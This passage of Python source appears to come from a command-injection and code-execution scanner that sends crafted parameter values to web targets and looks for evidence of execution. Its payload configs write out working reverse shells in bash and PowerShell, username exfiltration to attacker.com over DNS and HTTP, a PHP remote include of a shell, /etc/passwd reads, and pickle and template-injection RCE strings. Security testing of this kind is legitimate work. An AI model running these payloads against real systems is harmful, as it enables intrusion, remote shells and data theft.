import time
import requests
import hashlib
import logging
import sys
import os
import re
import json
import urllib.parse
from urllib.parse import quote, unquote, urlparse, parse_qs, urljoin, urlunparse, urlencode
from bs4 import BeautifulSoup

# 导入模块
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from modules.request_manager import RateLimiter
    from modules.request_queue import RequestQueueManager
    from modules.request_sender import RequestSender
    from modules.request_builder import RequestBuilder
    from modules.response_parse import ResponseParse
    from utils import load_config, load_command_config, load_code_exec_config
    
    print("✅ CommandCodeScanner 所有模块导入成功")
except ImportError as e:
    print(f"❌ 导入模块失败: {e}")
    print("请确保以下模块存在：")
    print("1. modules/request_manager.py")
    print("2. modules/request_queue.py")
    print("3. modules/request_sender.py")
    print("4. modules/request_builder.py")
    print("5. modules/response_parse.py")
    print("6. utils.py")
    sys.exit(1)

class CommandCodeScanner:
    def __init__(self, config=None):
        self.config = config or load_config()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; rv:109.0) Gecko/20100101 Firefox/115.0"
        })
        
        # 获取日志记录器
        self.logger = logging.getLogger('vuln_scanner.command_code')
        
        # 加载配置
        self.cmd_config = load_command_config() if 'load_command_config' in globals() else self._get_default_cmd_config()
        self.code_config = load_code_exec_config() if 'load_code_exec_config' in globals() else self._get_default_code_config()
        
        # 初始化速率限制器
        self.rate_limiter = RateLimiter(
            max_requests_per_second=self.config.get("max_requests_per_second", 20),
            max_requests_per_minute=self.config.get("max_requests_per_minute", 200)
        )
        
        # 初始化请求队列
        self.request_queue = RequestQueueManager(
            max_concurrent=self.config.get("max_concurrent_requests", 5),
            max_queue_size=self.config.get("max_queue_size", 100),
            rate_limiter=self.rate_limiter
        )
        
        # 初始化请求发送器
        self.request_sender = RequestSender(
            timeout=self.config.get("request_timeout", 10),
            verify_ssl=self.config.get("verify_ssl", False),
            user_agent=self.config.get("user_agent"),
            proxies=self.config.get("proxies"),
            max_retries=self.config.get("max_retries", 3)
        )

        # 初始化请求构造器和响应解析器
        self.request_builder = RequestBuilder()
        self.response_parser = ResponseParse()

        # 构建payload集合
        self.command_payloads = self._build_command_payloads()
        self.code_payloads = self._build_code_payloads()
        
        # 检测指示器
        self.command_indicators = self._get_command_indicators()
        self.code_indicators = self._get_code_indicators()
        
        # 时间延迟阈值
        self.time_delay_threshold = self.config.get("time_delay_threshold", 3.0)
        
        # 结果存储
        self.results = {
            "requests": [],
            "responses": [],
            "statistics": {},
            'vulnerabilities': [],
            'command_statistics': {
                "total_tested": 0,
                "vulnerable_urls": 0,
                "by_type": {},
                "by_os": {},
                "by_method": {}
            },
            'code_statistics': {
                "total_tested": 0,
                "vulnerable_urls": 0,
                "by_language": {},
                "by_type": {},
                "by_method": {}
            }
        }
        
        # 存储正常响应基准（用于对比）
        self.baseline_responses = {}

    def _get_default_cmd_config(self):
        """默认命令执行配置"""
        return {
            "time_delay_threshold": 3.0,
            "payloads": {
                "unix_generic": {
                    "echo_based": ["; echo COMMAND_TEST", "| echo COMMAND_TEST", "& echo COMMAND_TEST"],
                    "time_based": ["; sleep 3", "| sleep 3", "& sleep 3"],
                    "reverse_shell": ["; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"],
                    "file_operations": ["; cat /etc/passwd", "| ls -la", "& whoami"]
                },
                "windows_generic": {
                    "echo_based": ["& echo COMMAND_TEST", "| echo COMMAND_TEST", "&& echo COMMAND_TEST"],
                    "time_based": ["& timeout 3", "| ping -n 3 127.0.0.1"],
                    "reverse_shell": ["& powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""],
                    "file_operations": ["& type C:\\Windows\\win.ini", "| dir", "&& ipconfig"]
                },
                "blind_detection": {
                    "dns_exfiltration": ["; nslookup $(whoami).attacker.com", "& nslookup %USERNAME%.attacker.com"],
                    "http_exfiltration": ["; curl http://attacker.com/$(whoami)", "& powershell -c \"Invoke-WebRequest -Uri http://attacker.com/$env:USERNAME\""]
                }
            },
            "indicators": {
                "unix_output": ["COMMAND_TEST", "root:", "bin/bash", "/home/", "uid=", "gid=", "groups="],
                "windows_output": ["COMMAND_TEST", "Windows", "Administrator", "C:\\\\", "Volume in drive", "Directory of"],
                "error_indicators": ["sh:", "bash:", "cmd.exe", "powershell", "command not found", "is not recognized"],
                "time_based_confirm": ["sleep:", "timeout:", "ping statistics"]
            }
        }

    def _get_default_code_config(self):
        """默认代码执行配置"""
        return {
            "payloads": {
                "php_generic": {
                    "eval_based": ["; echo 'CODE_TEST';", "'; system('whoami'); //", "\"; system('whoami'); //"],
                    "system_based": ["; system('echo CODE_TEST');", "'; exec('whoami'); //"],
                    "file_include": ["; include('http://attacker.com/shell.php');", "'; require_once('shell.php'); //"],
                    "assert_based": ["'; assert('system(\"whoami\")'); //", "\"; assert(\"system('whoami')\"); //"]
                },
                "python_generic": {
                    "eval_based": ["'; exec('print(\"CODE_TEST\")') #", "\"; exec('import os; os.system(\"whoami\")') #"],
                    "os_system": ["'; __import__('os').system('echo CODE_TEST') #", "\"; os.system('whoami') #"],
                    "pickle_rce": ["'; pickle.loads(b'cos\\nsystem\\n(S'whoami'\\ntR.') #"],
                    "template_injection": ["{{config}}", "${7*7}", "<%= 7*7 %>"]
                },
                "java_generic": {
                    "runtime_exec": ["'; Runtime.getRuntime().exec(\"echo CODE_TEST\"); //"],
                    "process_builder": ["'; new ProcessBuilder(\"whoami\").start(); //"],
                    "el_injection": ["${7*7}", "#{7*7}", "@{7*7}"]
                },
                "nodejs_generic": {
                    "eval_based": ["'; eval('console.log(\"CODE_TEST\")') //", "\"; eval(\"require('child_process').exec('whoami')\") //"],
                    "child_process": ["'; require('child_process').exec('echo CODE_TEST') //"],
                    "template_injection": ["${7*7}", "<%= 7*7 %>", "{{7*7}}"]
                },
                "blind_detection": {
                    "time_based": ["; sleep(3)", "'; sleep(3) //", "\"; sleep(3) //"],
                    "dns_exfiltration": ["'; system('nslookup $(whoami).attacker.com') //"],
                    "conditional_output": ["'; echo md5('test'); //", "\"; print(md5('test')); #"]
                }
            },
            "indicators": {
                "php_output": ["CODE_TEST", "PHP Version", "PHP License", "System ", "Build Date"],
                "python_output": ["CODE_TEST", "Python", "__main__", "<module>", "os.system"],
                "java_output": ["CODE_TEST", "java.", "Runtime", "ProcessBuilder", "NullPointerException"],
                "nodejs_output": ["CODE_TEST", "child_process", "require(", "console.log", "Error:"],
                "error_indicators": ["PHP Parse error", "SyntaxError", "NameError", "TypeError", "Exception"],
                "template_indicators": ["49", "7777777", "config", "SECRET_KEY", "DATABASE_URL"]
            }
        }

    def _build_command_payloads(self):
        """构建命令执行payload集合"""
        payloads = {
            "unix_echo": [],
            "windows_echo": [],
            "unix_time": [],
            "windows_time": [],
            "unix_file": [],
            "windows_file": [],
            "reverse_shell": [],
            "blind_dns": [],
            "blind_http": [],
            "conditional": []
        }
        
        config_payloads = self.cmd_config.get("payloads", {})
        
        # Unix payloads
        if "unix_generic" in config_payloads:
            unix = config_payloads["unix_generic"]
            
            if "echo_based" in unix:
                for payload in unix["echo_based"]:
                    payloads["unix_echo"].append({
                        "payload": payload,
                        "os": "unix",
                        "type": "echo",
                        "separator": self._detect_separator(payload)
                    })
            
            if "time_based" in unix:
                for payload in unix["time_based"]:
                    payloads["unix_time"].append({
                        "payload": payload,
                        "os": "unix",
                        "type": "time",
                        "separator": self._detect_separator(payload)
                    })
            
            if "file_operations" in unix:
                for payload in unix["file_operations"]:
                    payloads["unix_file"].append({
                        "payload": payload,
                        "os": "unix",
                        "type": "file",
                        "separator": self._detect_separator(payload)
                    })
            
            if "reverse_shell" in unix:
                for payload in unix["reverse_shell"]:
                    payloads["reverse_shell"].append({
                        "payload": payload,
                        "os": "unix",
                        "type": "reverse",
                        "separator": self._detect_separator(payload)
                    })
        
        # Windows payloads
        if "windows_generic" in config_payloads:
            windows = config_payloads["windows_generic"]
            
            if "echo_based" in windows:
                for payload in windows["echo_based"]:
                    payloads["windows_echo"].append({
                        "payload": payload,
                        "os": "windows",
                        "type": "echo",
                        "separator": self._detect_separator(payload)
                    })
            
            if "time_based" in windows:
                for payload in windows["time_based"]:
                    payloads["windows_time"].append({
                        "payload": payload,
                        "os": "windows",
                        "type": "time",
                        "separator": self._detect_separator(payload)
                    })
            
            if "file_operations" in windows:
                for payload in windows["file_operations"]:
                    payloads["windows_file"].append({
                        "payload": payload,
                        "os": "windows",
                        "type": "file",
                        "separator": self._detect_separator(payload)
                    })
            
            if "reverse_shell" in windows:
                for payload in windows["reverse_shell"]:
                    payloads["reverse_shell"].append({
                        "payload": payload,
                        "os": "windows",
                        "type": "reverse",
                        "separator": self._detect_separator(payload)
                    })
        
        # 盲注检测payloads
        if "blind_detection" in config_payloads:
            blind = config_payloads["blind_detection"]
            
            if "dns_exfiltration" in blind:
                for payload in blind["dns_exfiltration"]:
                    payloads["blind_dns"].append({
                        "payload": payload,
                        "os": "both",
                        "type": "blind_dns",
                        "separator": self._detect_separator(payload)
                    })
            
            if "http_exfiltration" in blind:
                for payload in blind["http_exfiltration"]:
                    payloads["blind_http"].append({
                        "payload": payload,
                        "os": "both",
                        "type": "blind_http",
                        "separator": self._detect_separator(payload)
                    })
        
        # 条件payloads（用于验证）
        conditional_payloads = [
            {"payload": "; echo 'COMMAND_TEST' && echo 'VERIFIED'", "os": "unix", "type": "conditional", "separator": ";"},
            {"payload": "& echo COMMAND_TEST && echo VERIFIED", "os": "windows", "type": "conditional", "separator": "&"},
            {"payload": "| echo COMMAND_TEST | echo VERIFIED", "os": "both", "type": "conditional", "separator": "|"}
        ]
        payloads["conditional"].extend(conditional_payloads)
        
        # 输出统计信息
        for payload_type, payload_list in payloads.items():
            if payload_list:
                print(f"📦 加载 {payload_type} payload: {len(payload_list)} 个")
        
        return payloads

    def _build_code_payloads(self):
        """构建代码执行payload集合"""
        payloads = {
            "php_direct": [],
            "php_system": [],
            "php_include": [],
            "php_assert": [],
            "python_eval": [],
            "python_os": [],
            "python_template": [],
            "java_runtime": [],
            "java_template": [],
            "nodejs_eval": [],
            "nodejs_child": [],
            "nodejs_template": [],
            "blind_time": [],
            "blind_conditional": [],
            "generic_template": []
        }
        
        config_payloads = self.code_config.get("payloads", {})
        
        # PHP payloads
        if "php_generic" in config_payloads:
            php = config_payloads["php_generic"]
            
            if "eval_based" in php:
                for payload in php["eval_based"]:
                    payloads["php_direct"].append({
                        "payload": payload,
                        "language": "php",
                        "type": "eval",
                        "context": self._detect_context(payload)
                    })
            
            if "system_based" in php:
                for payload in php["system_based"]:
                    payloads["php_system"].append({
                        "payload": payload,
                        "language": "php",
                        "type": "system",
                        "context": self._detect_context(payload)
                    })
            
            if "file_include" in php:
                for payload in php["file_include"]:
                    payloads["php_include"].append({
                        "payload": payload,
                        "language": "php",
                        "type": "include",
                        "context": self._detect_context(payload)
                    })
            
            if "assert_based" in php:
                for payload in php["assert_based"]:
                    payloads["php_assert"].append({
                        "payload": payload,
                        "language": "php",
                        "type": "assert",
                        "context": self._detect_context(payload)
                    })
        
        # Python payloads
        if "python_generic" in config_payloads:
            python = config_payloads["python_generic"]
            
            if "eval_based" in python:
                for payload in python["eval_based"]:
                    payloads["python_eval"].append({
                        "payload": payload,
                        "language": "python",
                        "type": "eval",
                        "context": self._detect_context(payload)
                    })
            
            if "os_system" in python:
                for payload in python["os_system"]:
                    payloads["python_os"].append({
                        "payload": payload,
                        "language": "python",
                        "type": "os_system",
                        "context": self._detect_context(payload)
                    })
            
            if "template_injection" in python:
                for payload in python["template_injection"]:
                    payloads["python_template"].append({
                        "payload": payload,
                        "language": "python",
                        "type": "template",
                        "context": self._detect_context(payload)
                    })
        
        # Java payloads
        if "java_generic" in config_payloads:
            java = config_payloads["java_generic"]
            
            if "runtime_exec" in java:
                for payload in java["runtime_exec"]:
                    payloads["java_runtime"].append({
                        "payload": payload,
                        "language": "java",
                        "type": "runtime",
                        "context": self._detect_context(payload)
                    })
            
            if "el_injection" in java:
                for payload in java["el_injection"]:
                    payloads["java_template"].append({
                        "payload": payload,
                        "language": "java",
                        "type": "template",
                        "context": self._detect_context(payload)
                    })
        
        # Node.js payloads
        if "nodejs_generic" in config_payloads:
            nodejs = config_payloads["nodejs_generic"]
            
            if "eval_based" in nodejs:
                for payload in nodejs["eval_based"]:
                    payloads["nodejs_eval"].append({
                        "payload": payload,
                        "language": "nodejs",
                        "type": "eval",
                        "context": self._detect_context(payload)
                    })
            
            if "child_process" in nodejs:
                for payload in nodejs["child_process"]:
                    payloads["nodejs_child"].append({
                        "payload": payload,
                        "language": "nodejs",
                        "type": "child_process",
                        "context": self._detect_context(payload)
                    })
            
            if "template_injection" in nodejs:
                for payload in nodejs["template_injection"]:
                    payloads["nodejs_template"].append({
                        "payload": payload,
                        "language": "nodejs",
                        "type": "template",
                        "context": self._detect_context(payload)
                    })
        
        # 盲注检测payloads
        if "blind_detection" in config_payloads:
            blind = config_payloads["blind_detection"]
            
            if "time_based" in blind:
                for payload in blind["time_based"]:
                    payloads["blind_time"].append({
                        "payload": payload,
                        "language": "generic",
                        "type": "time",
                        "context": self._detect_context(payload)
                    })
            
            if "conditional_output" in blind:
                for payload in blind["conditional_output"]:
                    payloads["blind_conditional"].append({
                        "payload": payload,
                        "language": "generic",
                        "type": "conditional",
                        "context": self._detect_context(payload)
                    })
        
        # 通用模板注入payloads
        generic_template = [
            {"payload": "${7*7}", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "#{7*7}", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "@{7*7}", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "{{7*7}}", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "<%= 7*7 %>", "language": "generic", "type": "template", "context": "injection"},
            {"payload": "${T(java.lang.Runtime).getRuntime().exec('calc')}", "language": "java", "type": "template", "context": "injection"}
        ]
        payloads["generic_template"].extend(generic_template)
        
        # 输出统计信息
        for payload_type, payload_list in payloads.items():
            if payload_list:
                print(f"📦 加载 {payload_type} payload: {len(payload_list)} 个")
        
        return payloads

    def _get_command_indicators(self):
        """获取命令执行检测指示器"""
        indicators = self.cmd_config.get("indicators", {})
        
        # 添加默认指示器
        default_indicators = {
            "unix_output": ["COMMAND_TEST", "root:", "bin/bash", "/home/", "uid=", "gid=", "groups="],
            "windows_output": ["COMMAND_TEST", "Windows", "Administrator", "C:\\\\", "Volume in drive", "Directory of"],
            "error_indicators": ["sh:", "bash:", "cmd.exe", "powershell", "command not found", "is not recognized"],
            "time_based_confirm": ["sleep:", "timeout:", "ping statistics"]
        }
        
        # 合并配置和默认指示器
        for key, value in default_indicators.items():
            if key not in indicators:
                indicators[key] = value
        
        return indicators

    def _get_code_indicators(self):
        """获取代码执行检测指示器"""
        indicators = self.code_config.get("indicators", {})
        
        # 添加默认指示器
        default_indicators = {
            "php_output": ["CODE_TEST", "PHP Version", "PHP License", "System ", "Build Date"],
            "python_output": ["CODE_TEST", "Python", "__main__", "<module>", "os.system"],
            "java_output": ["CODE_TEST", "java.", "Runtime", "ProcessBuilder", "NullPointerException"],
            "nodejs_output": ["CODE_TEST", "child_process", "require(", "console.log", "Error:"],
            "error_indicators": ["PHP Parse error", "SyntaxError", "NameError", "TypeError", "Exception"],
            "template_indicators": ["49", "7777777", "config", "SECRET_KEY", "DATABASE_URL"]
        }
        
        # 合并配置和默认指示器
        for key, value in default_indicators.items():
            if key not in indicators:
                indicators[key] = value
        
        return indicators

    def _detect_separator(self, payload):
        """检测payload中的命令分隔符"""
        if ";" in payload:
            return ";"
        elif "&" in payload:
            return "&"
        elif "|" in payload:
            return "|"
        elif "&&" in payload:
            return "&&"
        elif "||" in payload:
            return "||"
        elif "`" in payload:
            return "`"
        elif "$(" in payload:
            return "$()"
        else:
            return "direct"

    def _detect_context(self, payload):
        """检测payload的上下文类型"""
        if "'" in payload and '"' in payload:
            return "mixed"
        elif "'" in payload:
            return "single_quote"
        elif '"' in payload:
            return "double_quote"
        elif ";" in payload:
            return "semicolon"
        else:
            return "direct"

    def parse_cookies(self, cookies_input):
        """
        将cookies字符串转换为字典
        """
        if not cookies_input:
            return {}

        if isinstance(cookies_input, dict):
            return cookies_input.copy()

        if isinstance(cookies_input, str):
            cookies_input = cookies_input.strip()
            
            if cookies_input.startswith('{') and cookies_input.endswith('}'):
                try:
                    return json.loads(cookies_input)
                except json.JSONDecodeError:
                    pass
            
            cookies_dict = {}
            if cookies_input.lower().startswith('cookie:'):
                cookies_input = cookies_input[7:].strip()

            pairs = cookies_input.split(';')
            for pair in pairs:
                pair = pair.strip()
                if not pair:
                    continue
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    cookies_dict[key.strip()] = value.strip()
                else:
                    cookies_dict[pair] = ''
            return cookies_dict

        return {}

    def send_controlled_request(self, request_info):
        """发送受控制的请求"""
        cookies_str = self.config.get("cookies")
        cookies = self.parse_cookies(cookies_str)
        
        def _make_request():
            method = request_info.get('method', 'GET')
            url = request_info.get('url')

            if not url:
                raise ValueError("请求URL不能为空")

            response = self.request_sender.send_request(
                method=method,
                url=url,
                params=request_info.get('params'),
                data=request_info.get('data'),
                json_data=request_info.get('json'),
                headers=request_info.get('headers'),
                cookies=cookies,
                allow_redirects=request_info.get('allow_redirects', True)
            )

            response_text = response.text
            if not isinstance(response_text, str):
                if response_text is None:
                    response_text = ''
                else:
                    response_text = str(response_text)

            content_length = len(response.content) if hasattr(response, 'content') else 0

            parsed_response = {}
            if hasattr(self.response_parser, 'parse_response'):
                try:
                    parsed_response = self.response_parser.parse_response(
                        response,
                        extract_links=True,
                        extract_forms=True,
                        base_url=url
                    )
                except Exception as e:
                    print(f"解析响应时出错: {e}")
                    parsed_response = {}

            return {
                'request': request_info,
                'response': {
                    'status_code': response.status_code if hasattr(response, 'status_code') else 0,
                    'url': str(response.url) if hasattr(response, 'url') else url,
                    'headers': dict(response.headers) if hasattr(response, 'headers') else {},
                    'text': response_text,
                    'content': response_text,
                    'content_length': content_length
                },
                'parsed': parsed_response
            }

        task_id = f"req_{int(time.time() * 1000)}_{hash(str(request_info)) % 10000}"

        try:
            self.request_queue.submit(task_id, _make_request)
        except Exception as e:
            print(f"[ERROR] 提交任务失败: {e}")
            try:
                result = _make_request()
                self._record_request_result(result)
                return result
            except Exception as e2:
                print(f"[ERROR] 直接请求也失败: {e2}")
                return None

        try:
            result = self.request_queue.get_result(task_id, timeout=30)
            self._record_request_result(result)
            return result
        except Exception as e:
            error_msg = f"请求失败: {request_info.get('url')} - {e}"
            if self.logger:
                self.logger.error(error_msg)
            else:
                print(error_msg)
            return None

    def _record_request_result(self, result):
        """记录请求结果"""
        if not result:
            return
        
        self.results['requests'].append(result['request'])
        self.results['responses'].append(result['response'])
        self._collect_statistics()

    def _collect_statistics(self):
        """收集统计信息"""
        self.results['statistics'] = {
            'request_stats': self.request_sender.get_statistics() if hasattr(self.request_sender, 'get_statistics') else {},
            'queue_stats': self.request_queue.get_statistics() if hasattr(self.request_queue, 'get_statistics') else {},
            'rate_limit_stats': self.rate_limiter.get_stats() if hasattr(self.rate_limiter, 'get_stats') else {},
            'scan_duration': f"{time.time():.2f}s"
        }

    def get_baseline_response(self, url, param_name, param_value, method, post_data):
        """获取基准响应"""
        baseline_key = f"{url}_{param_name}_{method}"

        if baseline_key in self.baseline_responses:
            return self.baseline_responses[baseline_key]

        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': {},
                'allow_redirects': True
            }

            if method.upper() == "GET":
                parsed_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = parsed_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data

            response = self.send_controlled_request(request_info)

            if response and 'response' in response:
                response_data = response['response']
                content = response_data.get('content', '')
                content_length = response_data.get('content_length', 0)
                status_code = response_data.get('status_code', 0)
                headers = response_data.get('headers', {})

                if isinstance(content, (list, tuple, dict)):
                    content = str(content)

                baseline = {
                    'content': content,
                    'length': content_length,
                    'status': status_code,
                    'time': 0,
                    'headers': headers,
                    'hash': hashlib.md5(content.encode()).hexdigest() if content else ''
                }

                self.baseline_responses[baseline_key] = baseline
                return baseline

        except Exception as e:
            print(f"获取基准响应失败: {e}")

        return None

    def _build_url_with_param(self, url, param_name, value):
        """构建带参数的URL"""
        if not isinstance(url, str):
            if isinstance(url, list):
                url = url[0] if url else ""
            else:
                url = str(url)

        if not url:
            return ""

        try:
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param_name] = [value]

            new_query = urlencode(query_dict, doseq=True)
            return parsed._replace(query=new_query).geturl()
        except Exception as e:
            print(f"❌ 构建URL参数失败: {e}")
            if '?' in url:
                return f"{url}&{param_name}={value}"
            else:
                return f"{url}?{param_name}={value}"

    # ==================== 命令执行检测方法 ====================

    def detect_command_echo_based(self, url, param_name, param_value, method, post_data):
        """基于回显的命令执行检测"""
        vulnerabilities = []
        
        # 测试Unix payloads
        for payload_info in self.command_payloads.get("unix_echo", [])[:5]:
            payload = payload_info["payload"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查响应中是否包含命令输出
                    indicators = self.command_indicators.get("unix_output", [])
                    for indicator in indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Command Injection (Echo-Based)',
                                'payload': payload,
                                'os': 'Unix/Linux',
                                'confidence': '高',
                                'evidence': f"发现输出: {indicator}",
                                'technique': 'Command output reflection',
                                'separator': separator,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        # 测试Windows payloads
        for payload_info in self.command_payloads.get("windows_echo", [])[:5]:
            payload = payload_info["payload"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    indicators = self.command_indicators.get("windows_output", [])
                    for indicator in indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Command Injection (Echo-Based)',
                                'payload': payload,
                                'os': 'Windows',
                                'confidence': '高',
                                'evidence': f"发现输出: {indicator}",
                                'technique': 'Command output reflection',
                                'separator': separator,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        return vulnerabilities

    def detect_command_time_based(self, url, param_name, param_value, method, post_data):
        """基于时间的命令执行检测"""
        vulnerabilities = []
        
        # 首先获取正常响应时间
        normal_time = self._measure_response_time(url, param_name, param_value, method, post_data)
        
        # 测试Unix时间payloads
        for payload_info in self.command_payloads.get("unix_time", [])[:3]:
            payload = payload_info["payload"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                response = self._send_command_test(url, param_name, test_value, method, post_data, 
                                                  timeout=self.time_delay_threshold + 5)
                
                elapsed_time = time.time() - start_time
                
                if elapsed_time > self.time_delay_threshold:
                    # 验证：发送不延迟的payload对比
                    no_delay_value = f"{param_value}{separator} echo test"
                    no_delay_time = self._measure_response_time(
                        url, param_name, no_delay_value, method, post_data
                    )
                    
                    if elapsed_time > no_delay_time * 3:
                        vulnerabilities.append({
                            'type': 'Command Injection (Time-Based)',
                            'payload': payload,
                            'os': 'Unix/Linux',
                            'confidence': '中',
                            'evidence': {
                                'normal_response_time': normal_time,
                                'delayed_response_time': elapsed_time,
                                'threshold': self.time_delay_threshold
                            },
                            'technique': 'Time delay',
                            'separator': separator
                        })
            
            except Exception as e:
                if "timeout" in str(e).lower():
                    vulnerabilities.append({
                        'type': 'Command Injection (Time-Based - Timeout)',
                        'payload': payload,
                        'os': 'Unix/Linux',
                        'confidence': '中',
                        'evidence': '请求超时',
                        'technique': 'Request timeout',
                        'separator': separator
                    })
                continue
        
        # 测试Windows时间payloads
        for payload_info in self.command_payloads.get("windows_time", [])[:3]:
            payload = payload_info["payload"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                response = self._send_command_test(url, param_name, test_value, method, post_data,
                                                  timeout=self.time_delay_threshold + 5)
                
                elapsed_time = time.time() - start_time
                
                if elapsed_time > self.time_delay_threshold:
                    no_delay_value = f"{param_value}{separator} echo test"
                    no_delay_time = self._measure_response_time(
                        url, param_name, no_delay_value, method, post_data
                    )
                    
                    if elapsed_time > no_delay_time * 3:
                        vulnerabilities.append({
                            'type': 'Command Injection (Time-Based)',
                            'payload': payload,
                            'os': 'Windows',
                            'confidence': '中',
                            'evidence': {
                                'normal_response_time': normal_time,
                                'delayed_response_time': elapsed_time,
                                'threshold': self.time_delay_threshold
                            },
                            'technique': 'Time delay',
                            'separator': separator
                        })
            
            except Exception as e:
                if "timeout" in str(e).lower():
                    vulnerabilities.append({
                        'type': 'Command Injection (Time-Based - Timeout)',
                        'payload': payload,
                        'os': 'Windows',
                        'confidence': '中',
                        'evidence': '请求超时',
                        'technique': 'Request timeout',
                        'separator': separator
                    })
                continue
        
        return vulnerabilities

    def detect_command_file_operations(self, url, param_name, param_value, method, post_data):
        """基于文件操作的命令执行检测"""
        vulnerabilities = []
        
        # 测试Unix文件操作payloads
        for payload_info in self.command_payloads.get("unix_file", [])[:5]:
            payload = payload_info["payload"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查常见的系统文件内容
                    file_indicators = [
                        "root:",  # /etc/passwd
                        "bin/",   # 系统目录
                        "/home/", # 用户目录
                        "total ", # ls -la 输出
                        "drwx",   # 目录权限
                        "-rwx",   # 文件权限
                        "uid=",   # id 命令输出
                        "gid="    # id 命令输出
                    ]
                    
                    for indicator in file_indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Command Injection (File Operation)',
                                'payload': payload,
                                'os': 'Unix/Linux',
                                'confidence': '高',
                                'evidence': f"发现文件操作痕迹: {indicator}",
                                'technique': 'File system access',
                                'separator': separator,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        # 测试Windows文件操作payloads
        for payload_info in self.command_payloads.get("windows_file", [])[:5]:
            payload = payload_info["payload"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查Windows系统信息
                    windows_indicators = [
                        "Volume in drive",
                        "Directory of",
                        "Administrator",
                        "C:\\\\",
                        "Program Files",
                        "Windows",
                        "ipconfig",
                        "Ethernet adapter"
                    ]
                    
                    for indicator in windows_indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Command Injection (File Operation)',
                                'payload': payload,
                                'os': 'Windows',
                                'confidence': '高',
                                'evidence': f"发现Windows系统信息: {indicator}",
                                'technique': 'File system access',
                                'separator': separator,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        return vulnerabilities

    def detect_command_blind_injection(self, url, param_name, param_value, method, post_data):
        """盲注命令执行检测"""
        vulnerabilities = []
        
        # 测试条件payloads验证漏洞
        for payload_info in self.command_payloads.get("conditional", [])[:3]:
            payload = payload_info["payload"]
            os_type = payload_info["os"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查条件输出
                    if "COMMAND_TEST" in content and "VERIFIED" in content:
                        vulnerabilities.append({
                            'type': 'Command Injection (Conditional Output)',
                            'payload': payload,
                            'os': os_type,
                            'confidence': '高',
                            'evidence': '条件输出验证成功',
                            'technique': 'Conditional command execution',
                            'separator': separator,
                            'response_code': response['response'].get('status_code', 0)
                        })
            
            except Exception:
                continue
        
        return vulnerabilities

    def _send_command_test(self, url, param_name, param_value, method, post_data, timeout=None):
        """发送命令执行测试请求"""
        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': {},
                'allow_redirects': True
            }
            
            if timeout:
                request_info['timeout'] = timeout
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            return self.send_controlled_request(request_info)
        except Exception as e:
            print(f"命令测试请求失败: {e}")
            return None

    def _measure_response_time(self, url, param_name, param_value, method, post_data):
        """测量响应时间"""
        try:
            start_time = time.time()
            
            response = self._send_command_test(url, param_name, param_value, method, post_data)
            if response:
                return time.time() - start_time
        except:
            return float('inf')
        
        return float('inf')

    # ==================== 代码执行检测方法 ====================

    def detect_code_eval_based(self, url, param_name, param_value, method, post_data):
        """基于eval的代码执行检测"""
        vulnerabilities = []
        
        # 测试PHP eval payloads
        for payload_info in self.code_payloads.get("php_direct", [])[:5]:
            payload = payload_info["payload"]
